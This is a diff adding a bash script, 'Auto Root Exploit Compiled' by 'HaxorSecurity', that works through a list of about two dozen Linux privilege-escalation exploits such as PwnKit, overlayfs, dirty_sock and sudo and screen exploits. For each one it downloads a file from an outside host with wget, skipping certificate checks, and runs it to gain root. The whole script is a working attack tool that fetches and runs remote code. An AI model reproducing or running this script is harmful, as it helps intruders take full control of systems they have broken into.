@@ -1,0 +1,56 @@
+#!/bin/bash
+clear
+echo "==================================================="
+echo "              Auto Root Exploit Compiled"
+echo "                by HaxorSecurity"
+echo "==================================================="
+
+cve=(
+    exxp
+    PwnKit
+    overlayfs
+    sudoroot
+    gameoverlay
+    dirty_sockv2.py
+    cve-2017-16995
+    dpipe
+    ofs64
+    ofs32
+    raceabrt
+    ptrace_traceme_root
+    lpe.sh
+    screenroot.sh
+    CVE-2025-0927
+    upstream44
+    exploit_cent7_userspec.py
+    exp_file_credential
+    timeoutpwn
+    exploit_timestamp_race
+    exploit_defaults_mailer.py
+    exploit_nss.py
+    screen.sh
+)
+
+for cvenya in "${cve[@]}"; do
+    echo " "
+    echo "[+] Trying Exploit $cvenya"
+    wget -q --no-check-certificate https://malamminggumiko.xyz/localroot/$cvenya
+    chmod 0755 $cvenya
+    if [[ "$cvenya" =~ "dpipe" ]];
+    then
+./$cvenya --root
+    else
+      if [[ "$cvenya" =~ ".py" ]];
+      then
+       python3 $cvenya
+      else
+        if [[ "$cvenya" =~ "raceabrt" ]];
+        then
+           ./$cvenya
+        else
+         ./$cvenya
+        fi
+       fi
+    fi
+done
+
